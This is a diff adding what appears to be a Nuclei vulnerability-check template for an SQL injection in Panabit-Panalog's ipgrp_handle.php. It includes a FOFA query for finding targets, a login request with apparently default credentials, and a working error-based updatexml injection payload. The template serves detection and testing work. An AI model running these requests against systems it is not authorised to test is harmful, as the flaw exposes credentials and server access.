@@ -1,0 +1,44 @@
+id: Panabit-Panalog-ipgrp_handle-sqli
+
+info:
+  name: Panabit-Panalog 后台 ipgrp_handle.php接口存在SQL注入漏洞
+  author: linfeng7z
+  severity: critical
+  description: Panabit-Panalog日志系统后台 ipgrp_handle.php接口存在SQL注入漏洞，攻击者可以通过此漏洞获取数据库敏感信息，用户名密码等凭据，进一步利用可获取服务器权限
+  metadata:
+    fofa-qeury: product="Panabit-Panalog"
+    veified: true
+  tags: panabit,panalog,sqli
+
+http:
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        
+        user=05110f8b023d9f2ca362d32a4e371923&mypass=f09052b749115479ca208bad0873b4b8&useldap=0
+      - |
+        POST /flow_direction/ipgrp_handle.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        type=ipgrp_add&grpname=1',(select updatexml(1,concat(0x7e,(md5(123456))),0)))--+&cloudip=1&devid=0&devname=%E6%89%80%E6%9C%89%E8%AE%BE%E5%A4%87
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_1
+        words:
+          - '\u7528\u6237\u4e0d\u5b58\u5728\u6216\u5bc6\u7801\u9519\u8bef'
+        negative: true
+
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200"
+          - "contains(body_2, 'e10adc3949ba59abbe56e057f20f883')"
+        condition: and
